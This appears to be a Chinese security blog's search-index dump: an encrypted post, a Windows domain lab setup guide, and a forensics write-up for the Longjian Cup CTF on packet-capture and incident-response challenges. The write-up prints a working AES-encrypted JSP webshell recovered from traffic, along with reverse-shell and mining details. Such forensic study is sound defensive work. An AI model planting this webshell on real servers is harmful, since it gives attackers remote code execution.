07147faa671f062310632e43a886ecc4055a4c02be98b43e03b01dc36031ab7c42f2a0652ef3679e611cb8210b711054168a7f28cebcbfc61d28c013f2e65a40c102b56b8fe738a92a322110b793384dfb81813e5c93f0e7a9643cfc4a88c54db156c2d911cea26c0c992091acbb16320cb6e55371111c775d17992846a292ba577bba4520d97c6c32f113d995999681070a199a456ca07a9595d32164ddc3dc0df309306f4247020f9b965772fbb53a35ebba64a76bcb712933c8df558bb69ee2c0f5079b1a38bcfaccfaf9bbb6a77d4660870e8cefd6854d4b420dd4bfdcdf6b24ffd295a5e523f7494cadccdbdd5e585c33a9c3393393f44a8ae2d779e4a2812ddc9a8449562b2a25f67a21665dc261f5b61d32c44dd4503df20689a746bead6d6b5d2df09123a7adb3d96005cc068f7660bd1bb6ee58fb87ce71b1820e1fda8e5f9f8700c4b89799af500b0d2bdc51aceacfc3ea2bf938d83b772e910dab9a30eda809e9751eb5d99279b425f47dc7e61bb99e86766f7c921fcf6f78a0f6d103a4c9cf162b8ecab7cf7a40bd61b08925ed0fc97f75d95011ce4340a140126327e9cfa3877abb1ba374e826ae132d901da0c71b3267007c1094530c8ff7a940211394b5f2bfabdee00faa5a52d886bc3a68ac65271669e9d17a6548f30bdacef9dfaf1b73974cb4bc1ae892f135e1a2bd94bb88a45507783041172dde7031ee6da73711e260b0af6d59744c10cd4b09310090e0eb9d3380a8966f462f0b0c9b63af55c80a7fd1660737968f3b9e4cdc0e65faa1a2486280735430515f4b2e6b50175e746df77ffac1cde658f8483309efe779765e066bf912e5fdd60f205026e1659c974e6b463af2c8e1592eccb103b7062db46fa43415c6a3ed7fc330d9acc5941dd5696697bb37adf445333301582d82733bb9fbc49d03d341e8097725306e1d31f7b81ecf70d4c0b709047e154631e90de82c0f2ba54217c3f66ba7aa74bf2112ed7279c84ab87a39bc627896a655d11bc4fe40ff2b56ea84b5ef0f08beef72a86188f8d31823022734bf0cc9076034f61681eab92e757ff6000af9fd7dae0810384e9fbf2b78aacb10f07656c70dcd19001ff45ff748757e4d6d740c47d029192ad1fec0cc1c60596e3c65938c8fb4d5257918643edcf58b7989e243e08b9f0b074a05f2625da3278a01746c948ef4053f648dea0a37871d56dc549504dee9b6ecaab60b819a7913c818bdf82b7b76921238a1ff3f2c1f0d8d31e5db36ca234c4fa303235ba40ddb894deba6b01a623c2fcbe72fd4fb788b9b1d7151b27d57a8e2efef4d1224a60c689b40c9345cc821a6ed334acc77065a141b91c5d292d4f9cb12510d4bbae267e9170227b8b2446efe69882bd4e7042503c28268f9f5118c1a2ecc170ac1d2fade8d59c0e6021701011754112e02481a208f541e0e65cd19793bd233dcc2e0708031812f8a62a3af5bf5f98cea2437cd3a5b684c66cd18f6a18954cf62da53723ac069e8cc7e72df916990ae63517cb823693244542e62a9a78f68ada5ca39b2724e6cbd80734c97fe42998df245eba9f3428b20a448253fc87131278be5346d74049221f0a480ac80c67906849cdda7c32715163e3f96500273224ce9d8815f54a6950330872033e59a18b83a2eac764d49eb1870de79906f9cc80a451a28497f6a0a2275d7db987348b98e67167262d0d0a717324215ed27edced86de3955e6e7e44a1634bf4d60dbc0795a36f24f114da855cac2f3760bec02767967905b355430331c35eefec1eaab3732e755b9c84c4cc5cea620a26861bc3a3dd1403758cea3e8e461b010c58ce02b67148a05727223616d1cb74136bb578c60ba77034dedaeaaa163d9287ff38ea6d094b052ac42bb97026f052b59ed6adb07ef18ba806038f75e7348353a906ebd1b896d52b2c59bd9a9dd8ef323c8fe1948b207c4602a7f46c9aef16e74dc5a54c583daea59d51f53ffe16880a9ceb189c607e7f85d820dbc99899e704bf7e65fd9721387d9eeacbba66d5a50ba53daa696e997e0a9b099422a61a1f5b0421897d73318bc1b81d9732dde5a8f35f29e0374f38baf924927bb73d91ae1ec48663ce9ec2823a4ab79de58e1b4369e48e13610ac4751db4a9f4df932af460c34bc672a242174142159f82efaaba02aaf76e103e539dd4853758245096f123848cc9009882a56c126e0174b02cbf50c086ab797ae5025f514d6552331a13d460f6d4a4656b1f688d9e0579ef58f5d6ba49769d444a8bee4bc725b152c899a140c6396f12d7584c1e738d2380faac51a8ac257d68e23e549ae5230af50054966a905a03cd2f46542068925e4446971b5351c046db901f08e9b631bad92304d6f481a98aadc8674cf3c27f562c0c8396d238653dfb23c1ce5511f1d312d349bd1f6104912853fef7cec5f3c39f0db5e5ba9f877c5b987ffeed39e6ec02bbac21a1506a5c0cd54e12cb83b096665d0a9baf4d528fb4700ff924e9470ba618602cada1fd0de530c4794756ea4a0fa8883b2f2ab99a83a9577ff35cfc4a088670b9b2f5274c01a2fe24ac10d83ae3a58b02db028b45b26d435c2f4a93bde4386202b526f001037a896ff5be224bc85f40f07641294c16fe6446412e642c9dda1a7c245653a56c3758b43347c29f37c55dd6600111b40fdaea17cd9df66675c30a95bf24aafa18aaa602bab082810b2c3b3f00f7b9aabaec64a0f3e30f978af0b78b0deed68c6afc19650f64ed7b2adccf90bd9cf0ba106a07b343f1b04e8806b17ab090a5af4384e75e914f10a26fd95e4c1c79ae702ccd141a300bc949c1c9c4b48dd60ea831cf9767edc0ae96b2aa0ee7520b00f34696f760d3fdc145516c8e688241914b137735eb275360d430d7c9cfded4c5517d1c66d8cef3077938e2d1d24fde2f749661d1aacf0984b092134a8e4bc4183404be2ebc73b106d59b399e7a51abf108c13610e09f5004abf109d3d03dc9e911e40d94d73c699778b0099c7e1c0ad2c8ba6e01a83f72cd5e88441290df6b9597e97102ae0cbea54eee974c1210887b0902a3e738ed7e20d8ba3d4f45323e43d6d058e0a496040f5bce74b8125a420ce3df8d4842d454215645f34b28c271f81981aec816c62bc83aa70ead78f130745fd02d8420d041394c99afb2b584aef920b270c591f89ab08e5896a6ec92df4fe7fd7e21a0bac19dc7baf5e5ef658959dbd064ee2026467c95e7eb51ebf952fe0f195a2d1628bb882e191f23d5ec852e682ba8a9d528771b531c1018c348348964c275250b370822f9f1dc431ac6ca34b8059216f9d035700f178b2df1d9b48d46838b116e30f8e0a004cded2ee01b4b0697b47ef4a90686d6d76495d5cd14d61750bc00d8a7a3d87a2a021e2e2e228fa8a5a850b9586cfc1e78151fe87876f8ce1c9dfb15d272224458ab024642fb79b2bdc7e1471bac9dd8c162489f792027b5c80096a7ea221be7593fcc5a6c011259b6e7cd23302064cafb5c97a78d388774bdcfc980415657cc37d2f0723bbae072906ba366695fe6df45a7ce61990dbc9f5446bd85574229399b87fa00edc8974d81c6e9731bf4060caa5c4b8bd16319088f9009d9c86e302ca4d469289a89897c447669a3724a538c0e0fc89d14680edfce11db180f59cfa006d17b08aff307a0a5d5bec60202e60788f4b6360b6010ab3261b3011120e3c714e659d6a5375c916850901c766af5bb688886239582766e27e0e8f042c3ad23efdb8ec192655cd0a4957c183cd70ed39a8e6f9ce188cbc662a2f5d3c7c11ed3b58db49e0744216273640fea156a116286c2ef1b1d4b24138b818d4584465923373676476a2bfc236a02c4da772cd23c7691bfc9551e8dc79e0068d8369e73b2036a21c98dc242a99c4ba86f24ccd949e80db39f03dde01515354a708b1fc6f49dec621083fcc449d863cc929a58ca577dd6009efe352146b8dbffb46c946464823d0d24a501519ed98e4293f3957228521f8eee0e614ee0f8a105b1a4ccfc8c5c669f8b8c1f2e63af7d32e72df2c4225eaf4099ab81c8d913f0134c9eb1d791794eba5ab0e91f5b37a9ada68e1d1441092d3b4dc637effb1ca19631ecf3c2ff3edb18dc93bbe2851da83c749e02aafecb82498b83afddaf1f0a5cc24bb1d798df65ac091e6e13348d14af45b43ca34ec5f0447a2d2a22354fdc3c78c42b6e436d5fba19d2c243f0b36b8c932e8bb5a05f8e3c39461bf88314fc32b873181c8e42d167923a3b5c1a51c330e48d817300f0a5c824b824c59528477a7f483589433309a99a645f76570817e91a3afd407d8a3c3aa0ed5f53e5c34e0452cab44f3240077744b1c614fdb5d34b77638eb9fd0e971ba3ec04bccf3104cc381956c8764a9cf3934672dcad978bf02659776db80feeeabf2a77d36110c05aa652c0142aa06e81ee6c4bcb2973ff74580127c4446d167d62700925676e3a01f38b48d3c75c817188540f2e1ac24bbe4615beacac18eeb2edd7a8d7123695fd0246216ccf7d7c364fb168fd2dc9f315d8a43446d208864a14046faa7c76c130374c6f795c7f404a05feeb284c7dedced25276413e2284862d3395a06e6d2826c0e4b55bed56d777513352a7ce2fde8291636e99aa247c007d7583cd17be81ff9cf6fe7569ebd7c8e35ea4672875d8687b996c4809e047551d61589abacc83d8e9c15cf5836a01bd73e453b67d12b74bea9f4914d5b4de0fcc6e3a2e2cc949ee1ba425963b2bdf192f01cb5b925cfc737df6e2f7e3ec4355216b0424342e896a7cac224db45a1ab7d315f770599e6dc028a04b0672849b04fefce2f0220de1cde35b78574c20558de5654936ac5f9db02e4ae9ee7ba39fcd4ceb014d1a9df2305f0318b830477fdc319b4d497aeb506ced1cbec851b91413ded6e5f186d606ba456e7bae40da9c8b1eb2e39db6cd3b41014adb1505b198a73f5dfd94d5176196f2ad9a05cb9d05c6dde68a83eef11a554009cfe02dd5f8d70aeda225443256aa37964a31d66c864d71643a5ac059826e152e4285e0157a4094948d04b3724e848afdd75617b55daad6f4676b63255c0758b7dac5cb4c8d4167a0dcef5c2e696eda8f7d1610d47d4b18b1d50999be758025dee3d145bc4fc1ffa6b0a551f1deb6006ef07b58c104dcd4687b8fba0b8110fd32cb0a1afea6bb6f25514996cd518069a12b3f7852c494a17cf433090b6231db259138162ed680f1d227116f8c50462051b220df261fdf3502896e85be5736ca50849a3282932209a0aa18efec0635a522cd3ec43bb6f32443f8c789b73a2c943b1d79a96d33668ff0da9b52249788e8466b19758d72b574743450b70a91ff23e4a6e71de24703b0d61990238d70d51b7576726792176b34e17cec33619b68a567e23909c18fb5768c47e7688569f1b7861446ecc5ab449898d9cdf09befae30770984f6187de7ae288386bc0b0b66d108cc49542d5fac2b989e946650a35637da9bab2b31b078b2d907f8671d9a0bed0cf0bd9e18948107f8c768026f4832cdd000089d1e1f4f32283a868647766c47968f45b5503ffe31c2d847e8c875e1e9b6f5061e68f58a3dd635313f278a21c8ce6d157c343c95c263dd2b9ae000207b7aa04d4389e6ab937bfbe0b04d5be9a170ce5fceb7a4c0ceecb9aa699eb1c0e47252f11a65750874244f8a0ec441734a140b9eb0f65606ab92f0fd23ecb5b3eb20e3c5068a1a612aad006eaaaf06fcb2bca61964486ee894ac924855d635a6987c286446f2fe04dfa9465eef7dded7c1a53e9944903e8fced0082bcf222a33f210e84a6a71671259d30bdc1a789c97ed1203d74dab690c0cfd5fdb873c35a41d9b3e7c16cb0679987a3980e154baa1b1f564fbcfc084e397d96852b2d2b4a254df23875eb830370a4e66df64f15274e3fc763d5cd440cfb90b2fc7135dd20b3ba3a91c69d38a2dd177ea3590236e99d4031ff6b3f7f4c33e5293972dc1f220a7234feec9f75c7697ebf1e84a0b483a035e3ff8929cefeff10e1c622eef9c206a9a038a8239d49ee99367539e24f589036ffc9904e43ecee925e1fb32050b33bae1f1d94f19cb5d2495fa724a1082cc5e25d6d46c483d7433bf9414abc383829a9b27a76e815025819593d7c6ca95dc42eee50cacd78b90bd853f6f09d699c5b16d8f76c2f108c1664f400ea06cdf21b41e8ff47a4d6d11fb71243e10359e76da5c455a39d76daeb2b019f5629696f1ccb3a3d7b5374ced9ec5fa1328835e361a87885b194d287206ced73e1a425cd6434689ce17d842dcb1522491f0d3562a5b63fded9c93c07dc6c665213a5cc99c74e2572774476f4d600e3ff07758099c88c4f6701d585bea05878cf4eec2abac69ff606aa93a693637c82e5bf3ba3f09ec4d35a2de11758470fda892dbddd86519fc86783f9618791959abdbc759d59fee0804c218340c110ac7000cfe217bcb6299dfd79fdf58b74372e6b4444d6cdb854de9b505767e1c1340b249960c5c30644d0170b224edce53bb4370518f6f8771c5e09bb4ba64361671889fd122f1c52144ff3122c54bdcd9ba752dfbf59a64f3f925ad43e21d3fa3e1b41536c9dc25982471433fc65d16356ecb6075c63bc789f3209dcfa9cf340c1fa4ab0d0f6e3be9436ef15c25ad9ad54dfff74ecd09f2cecbfd8e8c7e1cc9ba2bf8a9c4b2d86b9d7c61729bb37b4509a857969b6d3cd17d96316a9855f6d5b452fe0afa4aafbf57b3131ccb9e3968d868a1af9a3bc137f3b8f387066431dac241e6919cfde722c8b0c5b8ec375cf20a418c7c70eadd35cec2da48696fecfd5de8af71dc6ed5d5c898547556ab93a9d54350c44f69fde598c00e58db0c22d4a521c0e114c84780a7ddef66d42affa9777b84f4ddca5afc9d9d26effcd4ff5f02aef0ec271aec2169c608812bba617ba40af0dfdfae1c74d13c729b1835a2a9728645235818002b7b91584dc92ee60dc48168a99568ed4ef09d322ed4a4b55298a603a468354a025886528b9287c6888509a6764f53ef20f529674f96a31edd040912ed66af811fe261604ad620d5778c3041b506b12c45b442ca36a86675aa040493101ae18cd4a936b2ea1ebf9111a2f8780a1da16805d6cc1bfc5e7d88e28a4a7984e9539f4ee7a25aeee37f99354c42d78e4b0b8620f236c10ecf8920294cef5fdd2540c8d6a462d703154231064cc295d8e5940170a7eb7026784fd2e68c2b5fcaddebb6fbe608036b4f6823d8a10b6ae0df06d6ee98a0cd2b2480bfa909d6ca1604772f76a920b7ef49df4a09054f83f473a8039303cbf293c1c89dff3906b5ba24f681591e7fe698621719f4b8112877fe703d4b48152478407d73b63f86f0f445deb1b9d4d99041359935f23c7176aab4b57f0206eae8182f7a60d15f6dfa12b7cf8741f37eb6360caa7857ee8bf0dc7db606503376ab79e4f8eaa6f14b1715d986cc096865f79b2c232999cb2010f96f1735e0ad7ef9d5779ac1ce263df5b2e307b4198e2d2e7d456c2051345d76ac3cb29607bb747c0a8410fea99414e13af894eb4dec8e7821b19a49cb6683f97b0a4ee597bd78056379002615287c9cf229f6e6f95ac5edb54126f78cb9692af1657005b72e08bec8c3a42331cbf88b61abd01a59d15ab78d5d7c96f74ecce2ffddc71a61bb03903635036d6bba001c7218733e4740f3b9124c00d02a43a3d9b6994048bac23f827a9a35c748c92598b643b790805b1cef8b6dfa3b643a9b132f5093449360b9ccc33c182fef71f7869557af83f2b411910e22406f884151add2eca9183167f262515cc44416141af68547c6d9d45b997d52e5811aed18057f62ec8def62202ca4a7e126db17f80e928c997b8ccba646329419d690b7b161efbb3a2eac3d11678de067b131e81f883d1b2cc37b87e79953bb7ca2ce9c63876a4761c59d9de9ee870684ece487e77c7a50b41f54a9b040900f6acf7138babd67183525e543193adbfcf23c2f22649a00322796c1e38cbb356d9023c64bea079712c7a67a502d00470d9f0af0bfb4a1cf05418ec427bcdd333913596eafbe44572412a16614c96928a855f20a1824e52b4713f58e29c0e2d6bc3983112753cbd1a2b06b9a31c38ffa7f64aa3f752ad012eb3793b4eccc5ccb2895b1c46c05fdf0206c4d6cdae22ddf62d0162ae5b8158b685339aa3e389c13a0df8ea64ab4cf9cee548d9e329768a4b24d50334f7c5641d5a190ce344bda930e809fd711ddd638b88ed281874700e9ef8ecedd2eb61a62780151d2140d77b890081c96a63673b9996f84039cfa26cb7ce2fca5f3927c75e3d1e2a26dd9ab6f29874532396472ac3427dbb291f5aab2e15abdeb00302572636471cc34dae82b655648ca2399a85621c3c943fbccd15c30aceb42a771c2720780fe33909021f7e1303a9751005c61adedc4f1dffbb6a1c3b1087820d65fcb7bf662c82f7f87d80bd4855697e861defbdae5d63b432f107d49fc9ab99935bcfede1002d25768d4f289e8044396678d5c0ef5cbd9e6b856c3962a64bbe99ad2a57fcad584036a9f0fcb996000801eb875534e3367faac6b48c44b0f1205fafbaeaf74eb6ba2cffbc9c0836793eb9b3aeb20e70855ef282aae52adc34d50a538de335b0a4dcdf2105beb3bdee1ecebadf30151cf3fdacb2daa4f5c9615434b5440569d4468b5486aafec3b3f5f578c42f5a6c8dc09121711bb83d413b815e55e988d94ba31727bb5780adf1e7ebcb108e43a14f09763469a14b4945e606617ee37fdfa9a9db4228654edb1c315dbc79ba07fcb00237c7af45e7a99666edcaa934c8f91490c05898247da3479d8b785073cc6a80ac6ba797d05ed17640f38aae7c52700fbdfbb6ae9fd7cc8e42aa43c0045c6589d7aa76404e67736f49e1255c2ccbdd8b5eb49c4ed6d2101af3cbc493a2d39db94ee27ce57ef480d5caef16253d14f5c4794e998d00ae760854c4d762b16469eac7764542b6b05255e935a1dd339701c6de0b542a20d1ce22028964e246b58993d1d6b73a38671d599f26afc7824a97fca0b5110ca733c09cfb13c6410b0d3b9d6c9a03349c38cd5b3cf408db26642e0d74b23e3e3e3620614515ff2ef4dea8af57cdccb31d65516dac95f96129a68efb9a1c4a6ca4623b6758fdeead02ce2e387503f016cab5b74c52e47583a4f885330666b9109816e50b90dd15ba13b6328976dcf8f95189164e70c8492919f874555068716d791fc1f2985c28035e0e6aade184f1590bbce885fca8eb1335d8cd1a71fe7f297ed55d1406a3a7693e798d9bb4b26cc46aff931da6f07f10bc837cdeb125746cb82ad561f61d5b2304054e55658c75854e8a235124919035e91cfa9134426b62d9985a0a74086c1a289ede7e23bdb338821dbb47efab453fa874e6c1bbecf1ee061a66b26a95069c6d5cf94a97e1af4851bf406e1b82883bc265c6edafd2c0001383ad46cddf68543716bcc7c21102d86c84db63f2874dde7fc2e4c45c3e18d5adeaa0e9e95e6cc920d78a7bcd3757630ecc48ae201c86e77daf999fa3b4224af2418e481a6d2014819cc797135d0274a42b72b2b42f47d0ebc908aac186dceb698bf83ae70bf780ea2346a14bd1f76224c9784e581386887b7f293793b83648be19dd01260299f3265aedaf832d75b7ef3ad334abe50c7ddb7f8cefb5eea2f2e353114a9a07a0264746a3080c46ba305eecd705a5ef1b130fa835a0e74a74671410916e03b9ace960ef96c5d8d9f69f685c4b9ddcd3dfd4d0aa4c07da5eb10b26f3bf92ee7672ef73b37750fc1bb1fc796eba612c243a3d6394b98558bfcf4a34cb5af744743b68f62870ba9d90c6a2d3406b0a684c43ba181d5344a60473c3b0f9316d4601912f93279ca57245bc3b0814e88d17e47029b0adb3b4444bf1a816dada48fbbc0dc52e2324d322f8335c9985b8935761115e66113fcd6958bcdd0d8e2fbeb2e07f91801b465aa13d23893090d32a9bbd8b7c991ba3d8b6d7960714828509951d473d22d81f24b4698b928a19205e5b87c3b1fd2e24899078141652716521363d77009061d008ecea65b41ba6771dbf82ee597b2052ed6f52e39b24abb9e4bb25d784227f749f299ccad5af087fb51bc7a5d84005f6579759ee300fc8ba330243287e334458dc34433e7551f414d888920e4fdc930a3380dedd7e87595dce5b23885fc84fbb012a9475f965c19993906f150a3e983b4a68f822a4168fe5d6238aca2920f62e07cb3d1738eed5ae9f1b47404dea341e22f97b039241e562f0ccb5b658684dbd320b5b642483743cc617ab2b19f79defb1a2fe1d5d83b2414dc8374977690e7ffbc3b07d65cc7ced0f70d63f6b03ab18babd15b5cd29c4ac24d52e8870749ce58c23ac0854fac84f1090af1c1fd44ede7fc0ee205ccb625aa83a7fe38d249f832a31836e5422c415892530df316916c058013864ea2dd46aa25ba\n  \n    \n      \n      \n        Please Input quan9i's Password!\n      \n      \n        \n        \n      \n    \n  \n\n","slug":"内网隐藏隧道搭建","date":"2023-10-10T14:30:34.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"e905ff315b2bbf0b012e9f4774a59938","title":"内网渗透|域内信息搜集","content":"\n  \n  \n    \n      \n      \n        Please Input quan9i's Password!\n      \n      \n        \n        \n      \n    \n  \n\n","slug":"域内信息搜集","date":"2023-09-20T15:30:34.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"6690abdbc95c357e7775125250f59948","title":"内网渗透|域环境搭建","content":"域内环境搭建安装域控这里要选带有GUI的服务器，不然就只有CMD命令行，没有图形化界面\n\n之后持续下一步和同意即可至开机界面。\n我们要做的事情如下\n1、分配IP\n2、更改计算机名\n3、安装域控制器和DNS服务器\n4、升级服务器\n5、创建Active Directory用户\n\n接下首先进行分配IP的操作\n路径是控制面板-&gt;网络和Internet-&gt;网络连接\n而后选择属性，选中Internet 协议版本4这个，如下图配置即可\n\n此时IP就配置好啦。\n接下来来更改计算机名\n路径是控制面板-&gt;系统和安全-&gt;系统，而后点击更改设置，再选择更改即可，这里给其命名为DC\n\n这里点击确定后提示需要重启，我们确认后重启即可。\n重启之后名字也就更改完成了，接下来进行第三步，安装域控制器和DNS服务器，这里选择添加角色和功能\n\n而后一路默认，直到选择服务器角色这里，勾选Active Directory 域服务和DNS服务器\n\n而后再一路确定即可，直到最后，勾选重启服务器这个\n\n接下来点击安装即可\n接下来升级服务器，我们可以看到安装完成后旗子出现了黄色感叹号，点击会发现升级选项，点击即可\n\n而后我们选择添加新林，这里根域名自己随意填写即可\n\n而后来到这里，这里需要分配密码，这个密码的作用是当进入安全模式时，修复数据库用的，自己分配即可。\n\n这里提示了黄色告警，不过不用管，直接下一步即可\n\n这里是分配NetBIOS的域名，这个是针对不能用DNS服务的机器，使用NetBIOS服务来代替，这里默认即可\n\n而后一路默认，来到条件检查这里，发现报错，这里说是因为密码不符合要求，这是因为服务器升级为DC后，我们的机器也变成域管理员，需要符合强密码特征，所以接下来去修改密码\n\n接下来找到计算机管理界面，点击用户中的Administrator，右键选择设置密码，修改为强密码即可\n\n此时再去试下\n\n发现检查通过，点击安装即可，而后安装后要求重启，登录成功后点击DNS管理器，发现test.lab下存在dc\n\n此时即可视为安装成功。\n接下来安装AD用户\n\n这里随便配置下密码，选择不更改且不过期即可\n\n此时用户新建完成。\n接下来在Win7上配置IP\n\n本身IP需要与域控在同一C段下，这样才能访问到域控，DNS为域控IP。\n此时来到系统下，点击更改设置，选择域而非工作组，域赋值为test.lab\n\n这里输入我们刚刚设置好的用户名和密码\n\n此时点击确定\n\n此时提示需要重新启动，重启后发现还是本机用户，我们这里可以选择域内用户登录，可以是普通用户，也可以是域控\n\n我们这里选择切换用户，然后登录域普通用户\n\n此时登录成功后可以尝试ping下域控和DNS\n\n可以发现是Ping通的\n此时看下域控处能不能管理Win7\n\n发现此时报错了，这个其实是由于防火墙导致的，我们关闭Win7防火墙即可，而后再次来到域控右键Win7点击管理\n\n此时可以远程对Win7进行管理\n","slug":"域环境搭建","date":"2023-09-11T17:40:20.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"dfdceeab913ffdcb95d751ff910c7c8e","title":"陇剑杯复现","content":"HWhard_web_1题目内容：\n\n服务器开放了哪些端口，请按照端口大小顺序提交答案，并以英文逗号隔开(如服务器开放了80 81 82 83端口，则答案为80,81,82,83)\n\n\n\n下载附件后，点击分析中的专家信息\n\n然后选择Chat，可以发现\n\n开放端口为80,8888,888\nhard_web_2题目内容：\n\n服务器中根目录下的flag值是多少？\n\n追踪HTTP 20046流\n \n可以发现shell.jsp源码，具体内容如下\n&lt;%! String xc=\"748007e861908c03\"; class X extends ClassLoader&#123;public X(ClassLoader z)&#123;super(z);&#125;public Class Q(byte[] cb)&#123;return super.defineClass(cb, 0, cb.length);&#125; &#125;public byte[] x(byte[] s,boolean m)&#123; try&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); &#125;catch (Exception e)&#123;return null; &#125;&#125;%>&lt;%try&#123;byte[] data=new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];java.io.InputStream inputStream= request.getInputStream();int _num=0;while ((_num+=inputStream.read(data,_num,data.length))&lt;data.length);data=x(data, false);if (session.getAttribute(\"payload\")==null)&#123;session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(\"parameters\", data);Object f=((Class)session.getAttribute(\"payload\")).newInstance();java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();f.equals(arrOut);f.equals(pageContext);f.toString();response.getOutputStream().write(x(arrOut.toByteArray(), true));&#125; &#125;catch (Exception e)&#123;&#125;%>\n\nkey为748007e861908c03\n密文如下\nb5c1fadbb7e28da08572486d8e6933a84c5144463f178b352c5bda71cff4e8ffe919f0f115a528ebfc4a79b03aea0e31cb22d460ada998c7657d4d0f1be71ffa\n\n\n接下来进行解密即可\nfrom Crypto.Cipher import AES\nimport binascii\nimport zlib\n\n# 密钥，与 JSP 代码中的密钥相同\nkey = b'748007e861908c03'\n\n# 要解密的加密数据（十六进制形式）\nencrypted_hex_data = \"b5c1fadbb7e28da08572486d8e6933a84c5144463f178b352c5bda71cff4e8ffe919f0f115a528ebfc4a79b03aea0e31cb22d460ada998c7657d4d0f1be71ffa\"\n\ndef decode(data, key):\n    cipher = AES.new(key, AES.MODE_ECB)\n    decrypted_data = cipher.decrypt(data)\n    return decrypted_data\n\ndef ungzip(in_str):\n    s = zlib.decompress(in_str, 16 + zlib.MAX_WBITS).decode()\n    print(\"Decoded and Unzipped:\\n\", s)\n\n# 将十六进制数据转换为字节序列\nencrypted_bytes = bytes.fromhex(encrypted_hex_data)\n\n# 解密数据并解压缩\ndecrypted_data = decode(encrypted_bytes, key)\nungzip(decrypted_data)\n\nhard_web_3748007e861908c03 用cmd5爆破得到14mk3y\nSSsevrer save_1题目内容：黑客是使用什么漏洞来拿下root权限的。格式为：CVE-2020-114514\n本题附件见于平台公告的SS.zip，解压密码为c77ad47ba4c85fae66f08ec12e0085dd\n\n下载附件后追踪TCP流，发现恶意语句\n\n特征放入浏览器中寻找对应CVE\n\n因此flag为CVE-2022-22965\nsevrer save_2题目内容：黑客反弹shell的ip和端口是什么，格式为：10.0.0.1:4444\n\n追踪TCP流，发现木马文件bbbb.sh内容\n\n得到黑客反弹shell的IP和端口，即192.168.43.128:2333\nsevrer save_3题目内容：黑客的病毒名称是什么？ 格式为：filename\n\n在wireshark中输入tcp.port eq 2333可以看到跟反弹的ip的通信\n发现攻击者查看了rsa密钥，启动了ssh服务\n\n在附件中寻找，发现main\n此即为病毒名称\nsevrer save_4题目内容：黑客的病毒运行后创建了什么用户？请将回答用户名与密码：username:password\n\n查看etc/shadow文件，此处存放的是用户的密码\n\n可以发现最后一个用户，即11:123456\nsevrer save_5题目内容：服务器在被入侵时外网ip是多少? 格式为：10.10.0.1\n\n\n从日志文件中可以看出外网IP为172.105.202.239\nsevrer save_6题目内容：病毒运行后释放了什么文件？格式：文件1,文件2\n\n.idea内的即为释放的文件\n\nsevrer save_7题目内容：矿池地址是什么？ 格式：domain:1234\n\n\nsevrer save_8题目内容：黑客的钱包地址是多少？格式：xx:xxxxxxxx\n\n\nWSWireshark1_1题目内容：被入侵主机的IP是？\n\n打开附件进行流量分析，可以看到192.168.246.28在向192.168.24.1传输etc/passwd信息，由此可判定受害主机为192.146.246.28\n\nWireshark1_2题目内容：被入侵主机的口令是？\n\n追踪TCP流，可以发现password\n\n得到flag为youcannevergetthis\nWireshark1_3题目内容：用户目录下第二个文件夹的名称是？\n\n在追踪流下接着看\n\n可以看到执行了ls指令，回显中第二个是Downloads，因此第二个文件夹的名称为Downloads\nWireshark1_4题目内容：/etc/passwd中倒数第二个用户的用户名是？\n\nTCP流追踪\n\nmysql为倒数第二个\nIRIncidentResponse_1题目内容：你是公司的一名安全运营工程师，今日接到外部监管部门通报，你公司网络出口存在请求挖矿域名的行为。需要立即整改。经过与网络组配合，你们定位到了请求挖矿域名的内网IP是10.221.36.21。查询CMDB后得知该IP运行了公司的工时系统。（虚拟机账号密码为：root/IncidentResponsePasswd）\n挖矿程序所在路径是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）\n\nredis挖矿\n\n查看conf文件\n\n\n所以flag为6+72038a870f05cbf923633066e48881\nIncidentResponse_2题目内容：挖矿程序连接的矿池域名是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）\n\n域名为donate.v2.xmrig.com，因此按照格式转换一下就好了\n\nIncidentResponse_3攻击者入侵服务器的利用的方法是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）\n\n查看history\n\n发现nohup.log\n\n\n猜测是Shiro反序列化漏洞\n\nIncidentResponse_4题目内容：攻击者的IP是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）\n\nhistory查看历史命令\n\n发现多次ping81.70.166.3\n\nIncidentResponse_5题目内容：攻击者发起攻击时使用的User-Agent是？（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）\n\n查看日志，由于虚拟机cat只能看一部分，所以这里就用vim来预览\nvim /var/log/nginx/access.log\n\n\n发现伪造的UA\n最终把这两个UA合起来按要求转为md5即可\nIncidentResponse_6题目内容：攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以a开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）\n\n在root/.ssh下发现存在ssh私钥\n\nIncidentResponse_7题目内容：攻击者使用了两种权限维持手段，相应的配置文件路径是？(md5加密后以b开头)（答案中如有空格均需去除，如有大写均需变为小写，使用echo -n 'strings'|md5sum|cut -d ' ' -f1获取md5值作为答案）\n\n查看开机启动项\nsystemctl list-unit-files\n\n\n\n\n发现redis.service自启动，位置确定为/lib/systemed/system/redis.services，转换md5即可\nSSWSmallSword_1题目内容：连接蚁剑的正确密码是______________?（答案示例：123asd）\n\n在143流中发现key，此即为密码\n\nSmallSword_2题目内容：攻击者留存的值是______________?(答案示例：d1c3f0d3-68bb-4d85-a337-fb97cf99ee2e)\n\n\n\n在HTTP流中看，找到一个base64编码的\n\n解码得ad6269b7-3ce2-4ae8-b97f-f259515e7a91 